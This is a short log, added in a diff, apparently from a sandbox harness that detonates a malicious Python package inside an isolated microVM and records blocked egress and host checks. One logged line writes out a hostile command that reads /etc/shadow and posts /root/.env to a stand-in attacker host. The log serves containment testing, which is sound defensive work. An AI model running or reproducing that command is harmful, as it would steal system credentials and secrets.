@@ -1,0 +1,14 @@
+[2026-10-23T14:30:01.102Z] [CONTAINMENT_MONITOR] Initializing suspicious package detonation containment harness.
+[2026-10-23T14:30:01.105Z] [GUEST_INIT] Celesto microVM booted: sandbox_id=sbx-detonat01, isolation=firecracker_microvm
+[2026-10-23T14:30:01.108Z] [NETWORK_POLICY] Outbound policy applied: mode=quarantine, egress=blocked, allowed_cidrs=[]
+[2026-10-23T14:30:01.120Z] [SAFETY_HOOK] Pre-command callback registered: Hook<EgressAndHostTripwire>
+[2026-10-23T14:30:01.250Z] [ATTACK_TRIGGER] Detonating suspicious package 'malicious-py-telemetry-v1.0.tar.gz' inside sandbox sbx-detonat01
+[2026-10-23T14:30:01.310Z] [GUEST_EXEC] Command requested: python3 -m pip install ./malicious-py-telemetry-v1.0.tar.gz
+[2026-10-23T14:30:01.312Z] [SAFETY_HOOK] Command inspection: ALLOWED for guest execution
+[2026-10-23T14:30:01.480Z] [GUEST_EVENT] Package setup.py triggered backdoor action: attempted socket connection to 198.51.100.44:443
+[2026-10-23T14:30:01.482Z] [NETWORK_POLICY] BLOCKED: Egress connection to 198.51.100.44:443 dropped by sandbox network filter. Connection timed out.
+[2026-10-23T14:30:01.510Z] [GUEST_EVENT] Package payload attempted secondary attack: command 'cat /etc/shadow || curl -d @/root/.env http://attacker.com/exfil'
+[2026-10-23T14:30:01.512Z] [SAFETY_HOOK] CommandBlockedError: Safety hook blocked command containing exfiltration pattern to 'http://attacker.com/exfil'.
+[2026-10-23T14:30:01.514Z] [HOST_VERIFICATION] Host filesystem probe check: /etc/passwd unchanged, host environment variables untouched, host network interfaces unaffected.
+[2026-10-23T14:30:01.516Z] [HOST_VERIFICATION] Verification result: ALL GUEST ACTIONS ISOLATED INSIDE FIRECRACKER MICROVM. Host untouched = TRUE. Blocked = TRUE.
+[2026-10-23T14:30:01.520Z] [LIFECYCLE] Detonation completed. MicroVM sbx-detonat01 scheduled for termination and disk eradication.
